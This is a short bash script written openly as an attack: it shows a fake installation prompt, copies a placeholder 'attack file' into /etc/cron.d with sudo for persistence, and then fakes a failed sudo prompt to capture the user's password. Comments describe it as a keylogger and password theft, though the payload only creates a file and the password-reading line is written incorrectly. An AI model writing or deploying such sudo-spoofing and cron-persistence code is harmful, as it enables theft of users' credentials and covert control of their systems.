#!/bin/bash
# use social engineering - they trust that its their password
echo "For installation please enter your password"
# put the keylogger in the cronjob
# have to make file somewhere and then mv it to the cronjob

#string is the attack file
string="touch /tmp/testerFile.txt" 
echo $string > test.sh
chmod 777 test.sh

sudo cp test.sh /etc/cron.d/test.sh


# Make it look like they failed so i can steal their password
echo "Sorry, try again."
name=$(whoami)
echo -n "[sudo] password for $name: "
read -s $pass
# have now stolen the password
echo


